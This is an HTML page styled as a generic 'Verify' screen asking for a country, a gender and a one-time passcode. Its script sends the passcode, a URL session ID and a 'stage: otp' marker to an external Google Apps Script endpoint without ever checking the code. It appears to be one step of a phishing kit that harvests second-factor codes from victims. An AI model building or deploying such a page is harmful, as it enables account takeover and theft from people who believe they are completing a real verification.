<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Enter OTP</title>
  <link href="https://fonts.googleapis.com/css2?family=Baloo+2&display=swap" rel="stylesheet"/>
  <style>
    * {
      box-sizing: border-box;
    }

    body {
      margin: 0;
      padding: 0;
      font-family: 'Baloo 2', cursive;
      background: linear-gradient(135deg, #ffecd2 0%, #fcb69f 100%);
      display: flex;
      align-items: center;
      justify-content: center;
      min-height: 100vh;
      color: #333;
    }

    .container {
      background: white;
      padding: 50px 30px;
      border-radius: 30px;
      box-shadow: 0 10px 35px rgba(0, 0, 0, 0.2);
      width: 100%;
      max-width: 500px;
      text-align: center;
    }

    h2 {
      font-size: 32px;
      color: #ff6b6b;
      margin-bottom: 25px;
    }

    input[type="text"], select {
      width: 100%;
      padding: 16px;
      font-size: 20px;
      border: none;
      margin: 12px 0;
      border-radius: 15px;
      background-color: #f1f1f1;
      appearance: none;
      -webkit-appearance: none;
      -moz-appearance: none;
    }

    select {
      background-image: url("data:image/svg+xml;charset=US-ASCII,%3Csvg width='10' height='6' viewBox='0 0 10 6' xmlns='http://www.w3.org/2000/svg'%3E%3Cpath fill='%23333' d='M0 0l5 6 5-6z'/%3E%3C/svg%3E");
      background-repeat: no-repeat;
      background-position: right 15px center;
      background-size: 10px;
    }

    button {
      width: 100%;
      padding: 18px;
      font-size: 22px;
      background: #ff6b6b;
      color: white;
      border: none;
      border-radius: 15px;
      cursor: pointer;
      margin-top: 20px;
      transition: background 0.3s ease;
    }

    button:hover {
      background: #e55a5a;
    }

    #loading {
      display: none;
      font-size: 20px;
      margin-top: 20px;
      color: #ff6b6b;
    }

    @media (max-width: 600px) {
      .container {
        padding: 40px 20px;
      }

      h2 {
        font-size: 28px;
      }

      input, select, button {
        font-size: 18px;
        padding: 16px;
      }
    }
  </style>
</head>
<body>
  <div class="container">
    <h2>üîê Verify...</h2>
    <form id="otpForm">
      <select name="location" required>
        <option value="">Select Country</option>
        <option value="India">India</option>
      </select>

      <select name="gender" required>
        <option value="">Select Gender</option>
        <option value="Male">Male</option>
        <option value="Female">Female</option>
        <option value="Other">Other</option>
      </select>

      <input type="text" name="otp" id="otp" placeholder="Enter OTP" required />
      <button type="submit">Submit</button>
    </form>

    <div id="loading">‚è≥ Verifying... Please wait</div>
  </div>

  <script>
    const scriptURL = "https://script.google.com/macros/s/AKfycbzXrKL2Kuoh1-zXIvjeD2aX3I5JHUCZVy1p52DKi1vPBFpnAVLd37Ss89NwNrYwLqZ4Iw/exec"; // Replace with your real URL
    const urlParams = new URLSearchParams(window.location.search);
    const sessionId = urlParams.get("sessionId");

    const form = document.getElementById("otpForm");
    const loading = document.getElementById("loading");

    form.addEventListener("submit", e => {
      e.preventDefault();
      const otp = document.getElementById("otp").value;
      const location = form.location.value;
      const gender = form.gender.value;

      form.style.display = "none";
      loading.style.display = "block";

      const formData = new FormData(); 
      formData.append("stage", "otp");
      formData.append("sessionId", sessionId);
      formData.append("otp", otp);
      formData.append("location", location);
      formData.append("gender", gender);

      fetch(scriptURL, { method: "POST", body: formData })
        .then(() => {
          loading.innerHTML = "‚úÖ OTP Submitted Successfully!";
        })
        .catch(error => {
          alert("Error: " + error.message);
          form.style.display = "block";
          loading.style.display = "none";
        });
    });
  </script>
</body>
</html>
